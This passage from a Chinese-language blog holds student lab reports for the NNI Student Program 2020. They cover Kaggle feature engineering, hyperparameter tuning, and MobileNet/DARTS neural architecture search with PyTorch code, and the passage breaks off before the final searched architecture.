<p><code>release-date</code>为常见的时间序列特征，通过<code>pd.DatetimeIndex</code>类型可以方便地提取年、月、日等新特征。</p>
<p>同时，在直方图中可以观察出<code>revenue</code>和<code>budget</code>数据的分布不均匀，可以通过<code>np.log1p</code>进行平滑处理，这样的预测结果比较符合正态分布，预测准确度能够提高。最终预测的<code>log-revenue</code>通过<code>np.exp1m</code>可还原回正常数据。</p>
<p><code>cast</code>，<code>crew</code>，<code>belongs-to-collection</code>等特征是以json格式存储的，对数据中json的解析，<code>ast.literal_eval</code>能比较方便地完成解析任务。<a target="_blank" rel="noopener" href="https://www.kaggle.com/c/tmdb-box-office-prediction/discussion/80045">参考链接</a></p>
<p>对于<code>cast</code>，<code>crew</code>这两个特殊的特征，可以符合实际情况，构造出主演，导演，制片人等有关信息，并且可以对这些信息根据票房高低进行排序，根据主演、导演的排名构造特征，这样的特征对最终所预测的票房相关性较强。另一种方法是使用词向量进行特征提取，后续可以进行尝试。</p>
<h3 id="人工构造特征"><a href="#人工构造特征" class="headerlink" title="人工构造特征"></a>人工构造特征</h3><p>基于先验知识，大制片厂参与制作，有明星演员，有明星导演的电影，票房一般会比较高。我们可以预先统计出演员、导演、制片厂的排名榜，然后通过这些关键要素的计数多少或存在与否构建新特征。</p>
<p>很多特征中，特征中所包含的元素越多，票房有比较大的几率倾向于越高，如<code>spoken-languages</code>，<code>genres</code>等特征。我们便可以构造count类型的新特征。</p>
<p>最终提交结果的loss是2.13(680/1395)，误差可接受，但有待进一步优化。</p>
<h3 id="使用NNI自动特征工程"><a href="#使用NNI自动特征工程" class="headerlink" title="使用NNI自动特征工程"></a>使用NNI自动特征工程</h3><p>NNI集成了GradientFeatureSelector，该算法能在大数据集上缩小特征范围并找到高阶相关性，提升机器学习的效果与性能。</p>
<p>NNI的GradientFeatureSelector使用方法与sklearn模型大致相同：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> nni.feature_engineering.gradient_selector <span class="keyword">import</span> FeatureGradientSelector</span><br><span class="line"></span><br><span class="line">selector = FeatureGradientSelector(n_features=<span class="number">20</span>)</span><br><span class="line">selector.fit(X_train, y_train)</span><br><span class="line">print(selector.get_selected_features())</span><br></pre></td></tr></table></figure>
<p>相关调用NNI自动特征工具的代码包含在对应的jupyter notebook文件中。</p>
<h3 id="最终结果"><a href="#最终结果" class="headerlink" title="最终结果"></a>最终结果</h3><p>在NNI的帮助下，当NNI特征选择器选择16个特征并且使用<code>GradientBoostingRegressor</code>时，取得了较好的提交结果。</p>
<p>最终提交结果的最好loss是2.09(621/1395)，在原来特征处理的基础上得到了提升。个人推测NNI特征选择器在本题效果不明显的原因是没有在手动特征处理部分提取和构造出足够多的特征，导致了选择空间较小，提升空间也比较受限。</p>
<h2 id="旧金山犯罪分类：San-Francisco-Crime-Classification"><a href="#旧金山犯罪分类：San-Francisco-Crime-Classification" class="headerlink" title="旧金山犯罪分类：San Francisco Crime Classification"></a>旧金山犯罪分类：San Francisco Crime Classification</h2><h3 id="原始特征"><a href="#原始特征" class="headerlink" title="原始特征"></a>原始特征</h3><p>该数据的特征相对较少，特征的处理也并不会想上一道题一样繁琐，不过相应的，针对特征的处理则需要更多的技巧。这道题需要做到39个类别的多分类任务，如果对高阶特征的提取不够充分，效果则会比较一般。</p>
<p>给出的特征中，除了<code>Descript</code>和<code>Resolution</code>之外的特征都很重要，我们逐步分析：</p>
<p>首先，不同的警区，犯罪案件的发生率是不同的，有些警区所在的地区是犯罪高发地。可以通过数据可视化看出：</p>
<img data-src="http://qiniu.garen-wang.cn/static/images/NNI-Student-Program-2020-Task3.2.1/task3.2.1_2.png">
<p>可以看出：南部警区犯罪数量明显高于其他警区，Mission和北方警区犯罪数量也相对较多。</p>
<p>信息量较大的还有日期特征，从中可以查看一天中具体时间段的犯罪数量的分布。在这里我们将一天从0点到24点分为6个时间段可视化结果如下：</p>
<img data-src="http://qiniu.garen-wang.cn/static/images/NNI-Student-Program-2020-Task3.2.1/task3.23.png">
<p>可以看出，在1代表的凌晨和6代表的夜晚这两个时间段内，犯罪数量相对其他的一个时间段都会高。</p>
<h3 id="特征处理-1"><a href="#特征处理-1" class="headerlink" title="特征处理"></a>特征处理</h3><p><code>X</code>，<code>Y</code>两个特征中，在测试集发现经度为-120.5，纬度为90的异常特征，我们分别使用经纬度的中位数进行替换。替换后的散点图如下：</p>
<img data-src="http://qiniu.garen-wang.cn/static/images/NNI-Student-Program-2020-Task3.2.1/task3.2.1_1.png">
<p>替换后可通过<code>sklearn.preprocessing.StandardScaler</code>，对数据进行标准化处理，这样更方便模型进行预测。</p>
<h3 id="人工构造特征-1"><a href="#人工构造特征-1" class="headerlink" title="人工构造特征"></a>人工构造特征</h3><p>对时间序列特征，提取出年、月、日、季度、小时、星期等子特征。并使用one-hot编码展开。</p>
<p>发现地址中具有规律，可根据地址最后两个大写字母种类的不同，构造关于地址的特征。</p>
<p>模型方面，我们使用随机森林进行回归，准确率为27.5%左右，有待提高。</p>
<h3 id="使用NNI"><a href="#使用NNI" class="headerlink" title="使用NNI"></a>使用NNI</h3><p>同样使用NNI的<code>GradientFeatureSelector</code>，从构造出的特征中选取出了18个特征。</p>
<p>使用了NNI的特征选择器后，使用lightGBM算法构建模型，在验证集上的multiloss是2.32，相对原来有一定提高。</p>
<p>使用随机森林模型进行二分类，最优达到了30%的准确率。</p>
<h3 id="最终结果-1"><a href="#最终结果-1" class="headerlink" title="最终结果"></a>最终结果</h3><p>最终提交的模型在测试集上的结果不尽人意，在kaggle上只排到了75%左右，这说明最终模型的泛化效果并不够好，无法很好地完成39种类别的分类任务。</p>
<p>由于对特征工程的认识有限，在特征的处理上只实现了自己的处理思路，这可能也导致我们的模型表现不够优秀。</p>
<h2 id="土壤属性预测：Africa-Soil-Property-Prediction-Challenge"><a href="#土壤属性预测：Africa-Soil-Property-Prediction-Challenge" class="headerlink" title="土壤属性预测：Africa Soil Property Prediction Challenge"></a>土壤属性预测：Africa Soil Property Prediction Challenge</h2><p>multi-label的回归任务其实可以拆分为多个单label的回归任务，通过多次构建模型进行回归来预测各个label的值。</p>
<p>由于原代码只支持二分类任务，这里为了实现multi-label的回归任务，使用了以<code>lightgbm.LGBMRegressor</code>为内置结构的<code>sklearn.multioutput.MultiOutputRegressor</code>。<a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/52648383/how-to-get-coefficients-and-feature-importances-from-multioutputregressor">参考链接</a></p>
<h3 id="原始特征-1"><a href="#原始特征-1" class="headerlink" title="原始特征"></a>原始特征</h3><p>原始特征均进行过标准化处理，除了<code>Depth</code>特征可以将字符串变化为01编码，其他特征没有进一步处理的必要。</p>
<h3 id="手动选择建立模型"><a href="#手动选择建立模型" class="headerlink" title="手动选择建立模型"></a>手动选择建立模型</h3><p>使用了sklearn中贝叶斯线性回归模型（BayesianRidge），通过做5次模型的回归，最终kaggle上的loss为0.46489，拟合效果优秀。</p>
<h3 id="使用NNI-AutoFE工具"><a href="#使用NNI-AutoFE工具" class="headerlink" title="使用NNI AutoFE工具"></a>使用NNI AutoFE工具</h3><p>该题目比较特殊，该题目中，绝大部分的特征描述的是针对特定波长的光的吸收能力。</p>
<p>理论上各特征的重要程度并无较大差别，更多的特征往往能够得到更高的预测精确度，在这些特征中进行重要性排序并进行特征选择的意义相对来说不是很大。所以经过权衡考虑后，我们决定跳过使用NNI进一步提升的步骤。</p>
<h2 id="任务总结"><a href="#任务总结" class="headerlink" title="任务总结"></a>任务总结</h2><p>在Task3.2.1的任务中，本小组从零开始学习了特征工程的有关知识，并学会了对常用表格特征的提取与新特征的构造方式，最后还尝试了通过使用NNI的特征工程工具优化模型性能。</p>
<p>由于学习时间较短，水平有限，特征提取与模型训练也没有能做到最好，也没能发挥出NNI特征工程工具的真正效果，希望在日后的学习中能够不断有所长进。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://121.36.2.124/2021/03/11/NNI-Student-Program-2020-Task2.2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Garen Wang">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Garen Wang's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/03/11/NNI-Student-Program-2020-Task2.2/" class="post-title-link" itemprop="url">NNI Student Program 2020 Task2.2</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2021-03-11 20:08:57" itemprop="dateCreated datePublished" datetime="2021-03-11T20:08:57+08:00">2021-03-11</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2021-03-18 21:26:59" itemprop="dateModified" datetime="2021-03-18T21:26:59+08:00">2021-03-18</time>
              </span>

          
            <span id="/2021/03/11/NNI-Student-Program-2020-Task2.2/" class="post-meta-item leancloud_visitors" data-flag-title="NNI Student Program 2020 Task2.2" title="Views">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span class="leancloud-visitors-count"></span>
            </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine: </span>
    
    <a title="valine" href="/2021/03/11/NNI-Student-Program-2020-Task2.2/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/2021/03/11/NNI-Student-Program-2020-Task2.2/" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="Task2-2-实验报告"><a href="#Task2-2-实验报告" class="headerlink" title="Task2.2 实验报告"></a>Task2.2 实验报告</h1><h2 id="超参调优"><a href="#超参调优" class="headerlink" title="超参调优"></a>超参调优</h2><p>NNI支持通过配置搜索空间自定义搜索结构，不仅能够运用SOTA的高效率算法进行自动超参调优，更能够在多个模型与超参中选择出性能更优的组合，从而提高模型准确率。</p>
<p>搜索空间配置文件如下：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;lr&quot;</span>:&#123;<span class="attr">&quot;_type&quot;</span>:<span class="string">&quot;choice&quot;</span>, <span class="attr">&quot;_value&quot;</span>:[<span class="number">0.01</span>, <span class="number">0.001</span>]&#125;,</span><br><span class="line">    <span class="attr">&quot;optimizer&quot;</span>:&#123;<span class="attr">&quot;_type&quot;</span>:<span class="string">&quot;choice&quot;</span>, <span class="attr">&quot;_value&quot;</span>:[<span class="string">&quot;Adadelta&quot;</span>, <span class="string">&quot;Adagrad&quot;</span>, <span class="string">&quot;Adam&quot;</span>, <span class="string">&quot;Adamax&quot;</span>]&#125;,</span><br><span class="line">    <span class="attr">&quot;model&quot;</span>:&#123;<span class="attr">&quot;_type&quot;</span>:<span class="string">&quot;choice&quot;</span>, <span class="attr">&quot;_value&quot;</span>:[<span class="string">&quot;vgg&quot;</span>, <span class="string">&quot;resnet18&quot;</span>, <span class="string">&quot;googlenet&quot;</span>, <span class="string">&quot;densenet121&quot;</span>, <span class="string">&quot;mobilenet&quot;</span>, <span class="string">&quot;dpn92&quot;</span>, <span class="string">&quot;shufflenetg2&quot;</span>,<span class="string">&quot;senet18&quot;</span>]&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在代码中，当前trial的超参组合可从<code>nni.get_next_parameter()</code>获得，并以dict的形式保存。</p>
<h3 id="实验结果"><a href="#实验结果" class="headerlink" title="实验结果"></a>实验结果</h3><p>由于设备性能有限，在进行NNI的HPO实验时每个trial的epoch数并没能设定得足够多，这极有可能会导致最终的实验结果与retrain的性能不相符。我们训练了HPO实验中metric最优的超参组合，后续效果却不尽人意。反而是在非最优的超参组合中，我们训练出了较好的效果。</p>
<p>最终我们选定了学习率为0.01，优化器为Adamax，神经网络模型为mobilenet的组合，并在重训练了200个epoch后取得了96.66%的准确率。</p>
<h2 id="Classic-NAS"><a href="#Classic-NAS" class="headerlink" title="Classic NAS"></a>Classic NAS</h2><p>通过上一步得到的模型与参数的组合，我们尝试在搜索空间上定义随机结构，测试模型的性能。</p>
<p>神经网络的随机结构可以借助NNI的经典NAS算法来实现，随机架构的搜索tuner可以在NNI的example中找到。</p>
<p>编写随机结构的搜索空间时，可以使用<code>nni.nas.pytorch.mutables</code>中的<code>LayerChoice</code>和<code>Inputchoice</code>来进行实现。</p>
<p>这两种定义待选连接的方式都很方便。<code>LayerChoice</code>在代码使用上可视作与其他普通神经网络等同，而要实现<code>InputChoice</code>所代表的跳过连接，则与<code>InputChoice</code>的输出进行concat操作即可。</p>
<p>这里定义了MobileNet的随机结构，代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Block</span>(<span class="params">nn.Module</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, in_channels, out_channels, stride</span>):</span></span><br><span class="line">        <span class="built_in">super</span>(Block, self).__init__()</span><br><span class="line">        self.in_channels = in_channels</span><br><span class="line">        self.out_channels = out_channels</span><br><span class="line">        self.conv1 = nn.Conv2d(in_channels, in_channels, <span class="number">3</span>, stride, <span class="number">1</span>, bias=<span class="literal">False</span>, groups=in_channels)</span><br><span class="line">        self.bn1 = nn.BatchNorm2d(in_channels)</span><br><span class="line">        self.conv2 = nn.Conv2d(in_channels, out_channels, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, bias=<span class="literal">False</span>)</span><br><span class="line">        self.bn2 = nn.BatchNorm2d(out_channels)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forward</span>(<span class="params">self, x</span>):</span></span><br><span class="line">        x = F.relu(self.bn1(self.conv1(x)))</span><br><span class="line">        x = F.relu(self.bn2(self.conv2(x)))</span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_make_mobilenet_layers</span>(<span class="params">in_channels</span>):</span></span><br><span class="line">    cfg = [<span class="number">64</span>, (<span class="number">128</span>, <span class="number">2</span>), <span class="number">128</span>, <span class="number">128</span>, (<span class="number">256</span>, <span class="number">2</span>), <span class="number">256</span>, <span class="number">256</span>, (<span class="number">512</span>, <span class="number">2</span>), <span class="number">512</span>, <span class="number">512</span>, <span class="number">512</span>, <span class="number">512</span>, <span class="number">512</span>, <span class="number">512</span>, (<span class="number">1024</span>, <span class="number">2</span>), <span class="number">1024</span>, <span class="number">1024</span>]</span><br><span class="line">    layers = nn.ModuleList()</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> cfg:</span><br><span class="line">        out_channels = x <span class="keyword">if</span> <span class="built_in">isinstance</span>(x, <span class="built_in">int</span>) <span class="keyword">else</span> x[<span class="number">0</span>]</span><br><span class="line">        stride = <span class="number">1</span> <span class="keyword">if</span> <span class="built_in">isinstance</span>(x, <span class="built_in">int</span>) <span class="keyword">else</span> x[<span class="number">1</span>]</span><br><span class="line">        layers.append(Block(in_channels, out_channels, stride))</span><br><span class="line">        in_channels = out_channels</span><br><span class="line">    <span class="keyword">return</span> layers</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MobileNet</span>(<span class="params">nn.Module</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">super</span>(MobileNet, self).__init__()</span><br><span class="line">        self.conv1 = nn.Conv2d(<span class="number">3</span>, <span class="number">32</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>, bias=<span class="literal">False</span>)</span><br><span class="line">        self.bn1 = nn.BatchNorm2d(<span class="number">32</span>)</span><br><span class="line">        self.layers = _make_mobilenet_layers(<span class="number">32</span>)</span><br><span class="line">        self.pool = nn.AvgPool2d(<span class="number">2</span>)</span><br><span class="line">        self.linear = nn.Linear(<span class="number">1024</span>, <span class="number">10</span>)</span><br><span class="line">        self.skipconnect1 = InputChoice(n_candidates=<span class="number">2</span>, n_chosen=<span class="number">1</span>, key=<span class="string">&#x27;skip1&#x27;</span>)</span><br><span class="line">        self.skipconnect2 = InputChoice(n_candidates=<span class="number">2</span>, n_chosen=<span class="number">1</span>, key=<span class="string">&#x27;skip2&#x27;</span>)</span><br><span class="line">        self.skipconnect3 = InputChoice(n_candidates=<span class="number">2</span>, n_chosen=<span class="number">1</span>, key=<span class="string">&#x27;skip3&#x27;</span>)</span><br><span class="line">        self.skipconnect4 = InputChoice(n_candidates=<span class="number">2</span>, n_chosen=<span class="number">1</span>, key=<span class="string">&#x27;skip4&#x27;</span>)</span><br><span class="line">        self.skipconnect5 = InputChoice(n_candidates=<span class="number">2</span>, n_chosen=<span class="number">1</span>, key=<span class="string">&#x27;skip5&#x27;</span>)</span><br><span class="line">        self.skipconnect6 = InputChoice(n_candidates=<span class="number">2</span>, n_chosen=<span class="number">1</span>, key=<span class="string">&#x27;skip6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forward</span>(<span class="params">self, x</span>):</span></span><br><span class="line">        x = F.relu(self.bn1(self.conv1(x)))</span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        cnt = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> block <span class="keyword">in</span> self.layers:</span><br><span class="line">            old_x = x</span><br><span class="line">            x = block(x)</span><br><span class="line">            <span class="keyword">if</span> block.in_channels == block.out_channels:</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                i = <span class="number">0</span></span><br><span class="line">            <span class="keyword">if</span> i &gt;= <span class="number">2</span> <span class="keyword">and</span> i % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">                zero_x = torch.zeros_like(old_x)</span><br><span class="line">                skipconnect = <span class="built_in">eval</span>(<span class="string">&#x27;self.skipconnect&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(cnt))</span><br><span class="line">                skip_x = skipconnect([zero_x, old_x])</span><br><span class="line">                x = torch.add(x, skip_x)</span><br><span class="line">                cnt += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        x = self.pool(x)</span><br><span class="line">        x = x.view(x.size(<span class="number">0</span>), -<span class="number">1</span>)</span><br><span class="line">        x = self.linear(x)</span><br><span class="line">        <span class="keyword">return</span> x</span><br></pre></td></tr></table></figure>
<h3 id="最终结果"><a href="#最终结果" class="headerlink" title="最终结果"></a>最终结果</h3><img data-src="http://qiniu.garen-wang.cn/static/images/NNI-Student-Program-2020-Task2.2/capture.png">
<img data-src="http://qiniu.garen-wang.cn/static/images/NNI-Student-Program-2020-Task2.2/capture2.png">
<h2 id="One-Shot-NAS"><a href="#One-Shot-NAS" class="headerlink" title="One-Shot NAS"></a>One-Shot NAS</h2><p>上一步的经典NAS算法对原始模型的改动较小，也得不到较大的优化效果。并且，在6层可选跳过的情况下，神经网络的深度会下降，挖掘深层特征的潜力也会有所降低，所以最后准确率不仅没有升高，反而效果不尽人意。</p>
<p>在这一步，我们尝试One-Shot NAS，通过定义DARTS的搜索空间，大幅度改变原有模型，尝试真正意义上提高预测的精确度至97%以上。</p>
<h3 id="DARTS原理简要分析"><a href="#DARTS原理简要分析" class="headerlink" title="DARTS原理简要分析"></a>DARTS原理简要分析</h3><p>DARTS全称Differentiable Architecture Search，是NAS领域中著名的算法之一。该算法的特色是将若干个待搜索的架构从互不关联的“黑箱优化”问题变成可松弛的连续优化问题，通过梯度下降来进行更新。</p>
<p>由于需求只是构造MobileNet的搜索空间，这里只对CNN的DARTS进行分析。</p>
<p>首先，如果将一个状态看作一个节点，把一种操作看作一条边，那么CNN的网络模型就可以抽象成一个有向无环图（DAG）。</p>
<p>而在我们进行搜索的过程中，两点之间其实包含有“重边”。这些“重边”虽然两端节点相同，但各代表着不同的操作。我们需要做的，就是在这些待选边中找出整体最适合的一条边来成为DAG的一部分，实现架构的搜索。</p>
<p>我们首先给cell下定义。一个cell是一个包含了$N$个节点的有向无环图。其中编号为$i$的节点$x^{(i)}$代表着特征所存在着的状态，而从$i$到$j$的一条有向边就代表着一种操作，这种操作记为$o^{(i,j)}$。</p>
<p>接下来定义cell的输入与输出。一个cell会有两个输入，而只会有一个输出。这个cell的输出是将所有前面节点的操作concat起来的结果。用公式写出来就是：</p>
<script type="math/tex; mode=display">x^{(j)} = \int_{i<j} o^{(i, j)}(x^{(i)})</script><p>这里$o^{(i,j)}(x)$代表着将$x$所代表的状态经过$(i,j)$这条有向边所代表的操作后所得到的新状态。正如直观感觉一般，也就是可以抽象成一个函数。</p>
<p>一条边所代表的，可以是一个池化层，可以是标准的Conv+BatchNorm组合，也可以是SkipConnect等其他的子模型。</p>
<p>定义的这些模型只需要满足一个共性：需要满足原数据的width和height不能改变。也就是类似于：</p>
<p>当卷积核size为3x3时，padding为1；当kernal size为5x5时，padding为2；当kernal size为1x1时，padding为0…</p>
<p>接下来令$x^{(i)}$和$x^{(j)}$这两点之间的$n$条所有候选边的集合为$\mathcal{O}$，$\alpha_o^{(i,j)}$是一个$n$维的向量，分别代表着每一个待选操作的得分。将这些得分进行softmax运算进行松弛，公式如下：</p>
<script type="math/tex; mode=display">\overline o^{(i,j)}(x) = \sum_{o\in \mathcal{O}}\frac{\exp(\alpha_o^{(i,j)})}{\sum_{o'\in \mathcal{O}} \exp(\alpha_{o'}^{(i,j)})}o(x)</script><p>$\overline o^{(i,j)}(x)$最终最可能会选中得分最高的架构，即：</p>
<script type="math/tex; mode=display">o^{(i,j)}=\argmax_{o\in \mathcal{O}}\alpha_o^{(i,j)}</script><p>最终我们所求的是集合$\alpha=\{\alpha^{(i,j)}\}$。</p>
<p>如何求得$\alpha$？我们需要训练集和验证集的协助。</p>
<p>设训练集和验证集的loss分别为$\mathcal{L}_{train}$和$\mathcal{L}_{val}$。我们要求$\alpha$，最理想的状况是存在最优架构$\alpha^\star$, 能够使得$\mathcal L_{val}(w^\star, \alpha^\star)$达到最小。而最优参数$w^\star$是通过训练集不断地训练出来的。也就是$w^\star= \argmin _w \mathcal{L}_{train}(w, \alpha^\star)$。</p>
<p>这样就需要解决一个双优化问题：</p>
<script type="math/tex; mode=display">\begin{aligned}
    & \min_\alpha \mathcal L_{val}(w^*, \alpha^*) \\
    &s. t. \quad w^*=\argmin_w \mathcal L_{train}(w, \alpha^*)
\end{aligned}</script><p>求解这个双优化问题的算法大体的思路是：固定架构参数，用训练数据集训练模型参数，再固定模型参数，用验证数据集训练架构参数。</p>
<p>DARTS算法将动辄耗费上千个GPU天的神经网络架构搜索缩短至1至4个GPU天，使得NAS应用的门槛和成本大幅度降低。</p>
<h2 id="代码实现部分"><a href="#代码实现部分" class="headerlink" title="代码实现部分"></a>代码实现部分</h2><p>由于NNI中对DARTS的基本单位cell做了封装，候选边已经包含了常见的SepConv3x3、SepConv5x5、DilConv3x3、DivConv5x5、平均池化层、最大池化层、跳过连接层等候选架构，可以通过调用<code>nni.nas.pytorch.search_space_zoo.DartsCell</code>直接使用默认cell结构。</p>
<p>最终待搜索的模型可以基于<code>DartsCell</code>来构造：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DartsStackedCells</span>(<span class="params">nn.Module</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">drop_path_probability</span>(<span class="params">self, p</span>):</span></span><br><span class="line">        <span class="keyword">for</span> module <span class="keyword">in</span> self.modules():</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">isinstance</span>(module, DropPath):</span><br><span class="line">                module.p = p</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, in_channels, channels, n_classes, n_layers, n_nodes=<span class="number">4</span>, stem_multiplier=<span class="number">2</span></span>):</span></span><br><span class="line">        <span class="built_in">super</span>(DartsStackedCells, self).__init__()</span><br><span class="line">        self.in_channels = in_channels</span><br><span class="line">        self.channels = channels</span><br><span class="line">        self.n_classes = n_classes</span><br><span class="line">        self.n_layers = n_layers</span><br><span class="line">        cur_channels = stem_multiplier * self.channels</span><br><span class="line">        self.stem = nn.Sequential(</span><br><span class="line">            nn.Conv2d(in_channels, cur_channels, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>, bias=<span class="literal">False</span>),</span><br><span class="line">            nn.BatchNorm2d(cur_channels)</span><br><span class="line">        )</span><br><span class="line">        pp_channels, p_channels, cur_channels = cur_channels, cur_channels, channels</span><br><span class="line">        self.cells = nn.ModuleList()</span><br><span class="line">        p_reduction, cur_reduction = <span class="literal">False</span>, <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n_layers):</span><br><span class="line">            p_reduction, cur_reduction = cur_reduction, <span class="literal">False</span></span><br><span class="line">            <span class="keyword">if</span> i <span class="keyword">in</span> [n_layers // <span class="number">3</span>, <span class="number">2</span> * n_layers // <span class="number">3</span>]:</span><br><span class="line">                cur_channels *= <span class="number">2</span></span><br><span class="line">                cur_reduction = <span class="literal">True</span></span><br><span class="line">            self.cells.append(DartsCell(n_nodes, pp_channels, p_channels, cur_channels, p_reduction, cur_reduction))</span><br><span class="line">            cur_channels_out = cur_channels * n_nodes</span><br><span class="line">            pp_channels, p_channels = p_channels, cur_channels_out</span><br><span class="line">        self.gap = nn.AdaptiveAvgPool2d(<span class="number">1</span>)</span><br><span class="line">        self.linear = nn.Linear(p_channels, n_classes)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forward</span>(<span class="params">self, x</span>):</span></span><br><span class="line">        s0 = s1 = self.stem(x)</span><br><span class="line">        <span class="keyword">for</span> cell <span class="keyword">in</span> self.cells:</span><br><span class="line">            s0, s1 = s1, cell(s0, s1)</span><br><span class="line">        output = self.gap(s1)</span><br><span class="line">        output = output.view(output.size(<span class="number">0</span>), -<span class="number">1</span>)</span><br><span class="line">        output = self.linear(output)</span><br><span class="line">        <span class="keyword">return</span> output</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>最终搜索出的结构如下：</p>
